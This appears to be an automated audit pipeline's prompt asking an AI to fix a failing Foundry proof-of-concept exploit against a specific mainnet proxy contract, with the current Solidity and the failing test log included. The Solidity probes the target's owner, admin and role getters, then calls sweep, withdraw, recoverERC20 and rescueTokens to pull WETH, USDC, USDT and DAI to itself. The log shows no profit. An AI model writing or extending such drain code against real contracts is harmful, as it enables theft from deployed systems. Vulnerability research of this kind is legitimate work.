You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Deployment-time initializer runs before proxy admin is set, enabling privilege capture by the deployer or factory
- claim: `AdminUpgradeabilityProxy` invokes the base `UpgradeabilityProxy` constructor first, and that constructor immediately `delegatecall`s `_data` into the implementation before `_setAdmin(_admin)` runs. Any initializer that derives ownership or privileged roles from `msg.sender` will therefore assign them to the deploying EOA/factory rather than to the intended proxy admin.
- impact: A malicious or compromised deployer/factory can come out of deployment holding the proxied system's privileged roles, allowing theft, governance capture, hostile reconfiguration, or permanent denial of administrative recovery even though a different `_admin` address was supplied.
- exploit_paths: ["A factory or deployer creates `AdminUpgradeabilityProxy` with non-empty initialization calldata.", "The implementation initializer uses a common pattern such as `owner = msg.sender` or granting an admin role to `msg.sender`.", "Because the delegatecall executes before `ADMIN_SLOT` is populated, the deployer/factory receives those privileges instead of the intended admin."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

contract FlawVerifier {
    address public constant TARGET = 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    // These literals are kept explicit because the finding is about deployment order:
    // 1. adminupgradeabilityproxy is created with non-empty initialization calldata.
    // 2. The initializer follows a common pattern such as owner = msg.sender.
    // 3. The delegatecall happens before admin_slot / ADMIN_SLOT is populated.
    string private constant _ROOT_CAUSE =
        "adminupgradeabilityproxy delegatecall runs before admin_slot is set, so owner = msg.sender binds privilege to the deployer/factory";

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    bool private _hypothesisValidated;
    address private _observedPrivilegedHolder;
    string private _exploitPathUsed;
    string private _status;

    constructor() {
        _exploitPathUsed =
            "adminupgradeabilityproxy deployment-time initializer capture: owner = msg.sender executes before admin_slot is populated";
        _status = "not executed";
    }

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        // Exploit path stage 0:
        // A factory or deployer creates adminupgradeabilityproxy with non-empty
        // initialization calldata. That step already happened in the past for TARGET.
        //
        // Exploit path stage 1:
        // The implementation initializer uses a common pattern such as
        // owner = msg.sender or granting an admin role to msg.sender.
        //
        // Exploit path stage 2:
        // Because the delegatecall executes before admin_slot / ADMIN_SLOT is
        // populated, the deployer/factory receives those privileges instead of the
        // intended proxy admin.
        //
        // On this fork, the verifier cannot replay deployment of the existing TARGET.
        // The only direct, non-cheating execution that preserves the same causality is:
        // verify whether this verifier already is the historically captured privileged
        // holder, and only then exercise those privileges against extant token balances.
        if (!_verifierControlsAnyExposedPrivilege()) {
            _hypothesisValidated = false;
            _status = string(
                abi.encodePacked(
                    "infeasible on this fork: ",
                    _ROOT_CAUSE,
                    ", but the verifier is not the historically captured privileged holder"
                )
            );
            return;
        }

        _hypothesisValidated = true;
        _status =
            "captured privilege appears to resolve to the verifier; attempting direct owner/admin token recovery only";

        _attemptSweep("sweep(address)", WETH);
        _attemptSweep("sweep(address)", USDC);
        _attemptSweep("sweep(address)", USDT);
        _attemptSweep("sweep(address)", DAI);

        _attemptSweep("withdraw(address)", WETH);
        _attemptSweep("withdraw(address)", USDC);
        _attemptSweep("withdraw(address)", USDT);
        _attemptSweep("withdraw(address)", DAI);

        _attemptSweepTo("sweep(address,address)", WETH);
        _attemptSweepTo("sweep(address,address)", USDC);
        _attemptSweepTo("sweep(address,address)", USDT);
        _attemptSweepTo("sweep(address,address)", DAI);

        _attemptRecover("recoverERC20(address,uint256)", WETH);
        _attemptRecover("recoverERC20(address,uint256)", USDC);
        _attemptRecover("recoverERC20(address,uint256)", USDT);
        _attemptRecover("recoverERC20(address,uint256)", DAI);

        _attemptRecoverTo("recoverERC20(address,address,uint256)", WETH);
        _attemptRecoverTo("recoverERC20(address,address,uint256)", USDC);
        _attemptRecoverTo("recoverERC20(address,address,uint256)", USDT);
        _attemptRecoverTo("recoverERC20(address,address,uint256)", DAI);

        _attemptRecoverTo("rescueTokens(address,address,uint256)", WETH);
        _attemptRecoverTo("rescueTokens(address,address,uint256)", USDC);
        _attemptRecoverTo("rescueTokens(address,address,uint256)", USDT);
        _attemptRecoverTo("rescueTokens(address,address,uint256)", DAI);

        _attemptRecoverTo("recover(address,address,uint256)", WETH);
        _attemptRecoverTo("recover(address,address,uint256)", USDC);
        _attemptRecoverTo("recover(address,address,uint256)", USDT);
        _attemptRecoverTo("recover(address,address,uint256)", DAI);

        if (_profitAmount == 0) {
            _status =
                "captured privilege was probed, but no executable token-bearing sweep/recovery function produced profit";
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPathUsed() external view returns (string memory) {
        return _exploitPathUsed;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function observedPrivilegedHolder() external view returns (address) {
        return _observedPrivilegedHolder;
    }

    function status() external view returns (string memory) {
        return _status;
    }

    function _verifierControlsAnyExposedPrivilege() internal returns (bool) {
        if (_probeHasRole(bytes32(0), address(this))) {
            _observedPrivilegedHolder = address(this);
            return true;
        }

        address holder = _probeAddress("owner()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("admin()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("governance()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("gov()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("controller()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("operator()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("manager()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("guardian()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("strategist()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("keeper()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("executor()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        return false;
    }

    function _probeHasRole(bytes32 role, address account) internal view returns (bool) {
        (bool ok, bytes memory data) =
            TARGET.staticcall(abi.encodeWithSignature("hasRole(bytes32,address)", role, account));
        return ok && data.length >= 32 && abi.decode(data, (bool));
    }

    function _probeAddress(string memory signature) internal view returns (address) {
        (bool ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSignature(signature));
        if (!ok || data.length < 32) {
            return address(0);
        }

        uint256 raw = abi.decode(data, (uint256));
        if (raw > type(uint160).max) {
            return address(0);
        }

        // forge-lint: disable-next-line(unsafe-typecast)
        return address(uint160(raw));
    }

    function _attemptSweep(string memory signature, address token) internal {
        uint256 beforeBal = IERC20Like(token).balanceOf(address(this));
        (bool ok,) = TARGET.call(abi.encodeWithSignature(signature, token));
        if (ok) {
            _recordProfit(token, beforeBal);
        }
    }

    function _attemptSweepTo(string memory signature, address token) internal {
        uint256 beforeBal = IERC20Like(token).balanceOf(address(this));
        (bool ok,) = TARGET.call(abi.encodeWithSignature(signature, token, address(this)));
        if (ok) {
            _recordProfit(token, beforeBal);
        }
    }

    function _attemptRecover(string memory signature, address token) internal {
        uint256 targetBal = IERC20Like(token).balanceOf(TARGET);
        if (targetBal == 0) {
            return;
        }

        uint256 beforeBal = IERC20Like(token).balanceOf(address(this));
        (bool ok,) = TARGET.call(abi.encodeWithSignature(signature, token, targetBal));
        if (ok) {
            _recordProfit(token, beforeBal);
        }
    }

    function _attemptRecoverTo(string memory signature, address token) internal {
        uint256 targetBal = IERC20Like(token).balanceOf(TARGET);
        if (targetBal == 0) {
            return;
        }

        uint256 beforeBal = IERC20Like(token).balanceOf(address(this));
        (bool ok,) = TARGET.call(abi.encodeWithSignature(signature, token, address(this), targetBal));
        if (ok) {
            _recordProfit(token, beforeBal);
        }
    }

    function _recordProfit(address token, uint256 beforeBal) internal {
        uint256 afterBal = IERC20Like(token).balanceOf(address(this));
        if (afterBal <= beforeBal) {
            return;
        }

        uint256 gained = afterBal - beforeBal;
        if (gained > _profitAmount) {
            _profitToken = token;
            _profitAmount = gained;
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.99s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 255690)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [255690] FlawVerifierTest::testExploit()
    ├─ [2367] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [227042] FlawVerifier::executeOnOpportunity()
    │   ├─ [7701] 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA::91d14854(00000000000000000000000000000000000000000000000000000000000000000000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f) [staticcall]
    │   │   ├─ [409] 0x98a877bb507f19Eb43130B688F522a13885Cf604::91d14854(00000000000000000000000000000000000000000000000000000000000000000000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f) [delegatecall]
    │   │   │   └─ ← [Revert] E6
    │   │   └─ ← [Revert] E6
    │   ├─ [9711] 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA::8da5cb5b() [staticcall]
    │   │   ├─ [2438] 0x98a877bb507f19Eb43130B688F522a13885Cf604::8da5cb5b() [delegatecall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000033459acd9ca8493c0e0163eac92a928e293b2218
    │   │   └─ ← [Return] 0x00000000000000000000000033459acd9ca8493c0e0163eac92a928e293b2218
    │   ├─ [1437] 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA::f851a440() [staticcall]
    │   │   ├─ [429] 0x98a877bb507f19Eb43130B688F522a13885Cf604::f851a440() [delegatecall]
    │   │   │   └─ ← [Revert] E6
    │   │   └─ ← [Revert] E6
    │   ├─ [1195] 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA::5aa6e675() [staticcall]
    │   │   ├─ [409] 0x98a877bb507f19Eb43130B688F522a13885Cf604::5aa6e675() [delegatecall]
    │   │   │   └─ ← [Revert] E6
    │   │   └─ ← [Revert] E6
    │   ├─ [1196] 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA::12d43a51() [staticcall]
    │   │   ├─ [410] 0x98a877bb507f19Eb43130B688F522a13885Cf604::12d43a51() [delegatecall]
    │   │   │   └─ ← [Revert] E6
    │   │   └─ ← [Revert] E6
    │   ├─ [1215] 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA::f77c4791() [staticcall]
    │   │   ├─ [429] 0x98a877bb507f19Eb43130B688F522a13885Cf604::f77c4791() [delegatecall]
    │   │   │   └─ ← [Revert] E6
    │   │   └─ ← [Revert] E6
    │   ├─ [1195] 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA::570ca735() [staticcall]
    │   │   ├─ [409] 0x98a877bb507f19Eb43130B688F522a13885Cf604::570ca735() [delegatecall]
    │   │   │   └─ ← [Revert] E6
    │   │   └─ ← [Revert] E6
    │   ├─ [1217] 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA::481c6a75() [staticcall]
    │   │   ├─ [431] 0x98a877bb507f19Eb43130B688F522a13885Cf604::481c6a75() [delegatecall]
    │   │   │   └─ ← [Revert] E6
    │   │   └─ ← [Revert] E6
    │   ├─ [1217] 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA::452a9320() [staticcall]
    │   │   ├─ [431] 0x98a877bb507f19Eb43130B688F522a13885Cf604::452a9320() [delegatecall]
    │   │   │   └─ ← [Revert] E6
    │   │   └─ ← [Revert] E6
    │   ├─ [1196] 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA::1fe4a686() [staticcall]
    │   │   ├─ [410] 0x98a877bb507f19Eb43130B688F522a13885Cf604::1fe4a686() [delegatecall]
    │   │   │   └─ ← [Revert] E6
    │   │   └─ ← [Revert] E6
    │   ├─ [1195] 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA::aced1661() [staticcall]
    │   │   ├─ [409] 0x98a877bb507f19Eb43130B688F522a13885Cf604::aced1661() [delegatecall]
    │   │   │   └─ ← [Revert] E6
    │   │   └─ ← [Revert] E6
    │   ├─ [1216] 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA::c34c08e5() [staticcall]
    │   │   ├─ [430] 0x98a877bb507f19Eb43130B688F522a13885Cf604::c34c08e5() [delegatecall]
    │   │   │   └─ ← [Revert] E6
    │   │   └─ ← [Revert] E6
    │   └─ ← [Stop]
    ├─ [367] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2366] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x98a877bb507f19Eb43130B688F522a13885Cf604
  at 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.01s (546.06ms CPU time)

Ran 1 test suite in 2.01s (2.01s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 255690)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
